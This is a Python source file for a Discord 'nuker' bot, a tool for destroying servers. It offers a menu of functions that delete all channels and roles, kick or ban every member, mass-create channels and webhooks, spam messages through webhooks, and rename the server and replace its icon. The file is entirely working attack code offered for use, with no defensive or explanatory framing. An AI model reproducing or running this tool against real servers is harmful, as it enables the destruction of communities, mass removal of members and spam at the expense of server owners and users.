# All functions and assets related to nuker will be stored here.

import discord
from discord.ext import commands
from colorama import Fore, Style, init

intents = discord.Intents.default()
intents.members = True  # Required for kick/ban operations
bot = commands.Bot(command_prefix='!', intents=intents)

nuker_art = r'''
                        [01] > Back             [02] > Delete Channels  [03] > Delete Roles
                        [04] > Kick All         [05] > Ban All          [06] > Create Channels
                        [07] > Create Roles     [08] > Create Webhooks  [09] > Delete Webhooks
                        [10] > Spam Webhooks    [11] > Set Server Name  [12] > Set Server Icon


'''

init(autoreset=True)  # Initialize colorama

intents = discord.Intents.default()
intents.members = True  # Required for kick/ban operations
bot = commands.Bot(command_prefix='!', intents=intents)

def get_bot_token():
    try:
        with open('assets/config/bottoken.txt', 'r') as f:
            return f.read().strip()
    except FileNotFoundError:
        print(Fore.RED + "[-] Bot token file not found. Please ensure 'assets/config/bottoken.txt' exists." + Style.RESET_ALL)
        exit(1)
    except Exception as e:
        print(Fore.RED + f"[-] Error reading bot token: {e}" + Style.RESET_ALL)
        exit(1)

async def delete_channels(guild):
    for channel in guild.channels:
        try:
            await channel.delete()
            print(Fore.GREEN + f"[+] Deleted channel: {channel.name}" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + f"[-] Failed to delete channel {channel.name}: {e}" + Style.RESET_ALL)

async def delete_roles(guild):
    for role in guild.roles:
        if role.name != "@everyone":  # Prevent deletion of @everyone
            try:
                await role.delete()
                print(Fore.GREEN + f"[+] Deleted role: {role.name}" + Style.RESET_ALL)
            except Exception as e:
                print(Fore.RED + f"[-] Failed to delete role {role.name}: {e}" + Style.RESET_ALL)

async def kick_all(guild):
    for member in guild.members:
        if not member.bot:  # Avoid kicking bots
            try:
                await member.kick()
                print(Fore.GREEN + f"[+] Kicked member: {member.name}" + Style.RESET_ALL)
            except Exception as e:
                print(Fore.RED + f"[-] Failed to kick member {member.name}: {e}" + Style.RESET_ALL)

async def ban_all(guild):
    for member in guild.members:
        try:
            await guild.ban(member)
            print(Fore.GREEN + f"[+] Banned member: {member.name}" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + f"[-] Failed to ban member {member.name}: {e}" + Style.RESET_ALL)

async def create_channels(guild):
    channel_name = input(Fore.MAGENTA + "[?] Enter the channel name: " + Style.RESET_ALL)
    try:
        amount = int(input(Fore.MAGENTA + "[?] Enter the number of channels to create: " + Style.RESET_ALL))
        for _ in range(amount):
            await guild.create_text_channel(channel_name)
            print(Fore.GREEN + f"[+] Created channel: {channel_name}" + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"[-] Failed to create channels: {e}" + Style.RESET_ALL)

async def create_webhooks(guild):
    for channel in guild.text_channels:
        try:
            await channel.create_webhook(name=f"Webhook-{channel.name}")
            print(Fore.GREEN + f"[+] Created webhook for channel: {channel.name}" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + f"[-] Failed to create webhook for channel {channel.name}: {e}" + Style.RESET_ALL)

async def delete_webhooks(guild):
    for channel in guild.text_channels:
        webhooks = await channel.webhooks()
        for webhook in webhooks:
            try:
                await webhook.delete()
                print(Fore.GREEN + f"[+] Deleted webhook: {webhook.name}" + Style.RESET_ALL)
            except Exception as e:
                print(Fore.RED + f"[-] Failed to delete webhook {webhook.name}: {e}" + Style.RESET_ALL)

async def spam_webhooks(guild):
    webhook_name = input(Fore.MAGENTA + "[?] Enter the webhook name: " + Style.RESET_ALL)
    message = input(Fore.MAGENTA + "[?] Enter the message to send: " + Style.RESET_ALL)
    try:
        amount = int(input(Fore.MAGENTA + "[?] Enter the number of messages to send: " + Style.RESET_ALL))
        for channel in guild.text_channels:
            webhooks = await channel.webhooks()
            for webhook in webhooks:
                for _ in range(amount):
                    try:
                        await webhook.send(content=message, username=webhook_name)
                        print(Fore.GREEN + f"[+] Sent message to webhook: {webhook.name}" + Style.RESET_ALL)
                    except Exception as e:
                        print(Fore.RED + f"[-] Failed to send message to webhook {webhook.name}: {e}" + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"[-] Error in spamming webhooks: {e}" + Style.RESET_ALL)

async def set_server_name(guild):
    server_name = input(Fore.MAGENTA + "[?] Enter the new server name: " + Style.RESET_ALL)
    try:
        await guild.edit(name=server_name)
        print(Fore.GREEN + f"[+] Server name changed to: {server_name}" + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"[-] Failed to change server name: {e}" + Style.RESET_ALL)

async def set_server_icon(guild):
    icon_path = input(Fore.MAGENTA + "[?] Enter the path to the new server icon: " + Style.RESET_ALL)
    try:
        with open(icon_path, 'rb') as icon_file:
            icon_bytes = icon_file.read()
            await guild.edit(icon=icon_bytes)
            print(Fore.GREEN + "[+] Server icon updated successfully." + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"[-] Failed to change server icon: {e}" + Style.RESET_ALL)

@bot.event
async def on_ready():
    print(Fore.YELLOW + f"[>] Bot is ready. Logged in as {bot.user}" + Style.RESET_ALL)

def start_bot():
    bot_token = get_bot_token()
    bot.run(bot_token)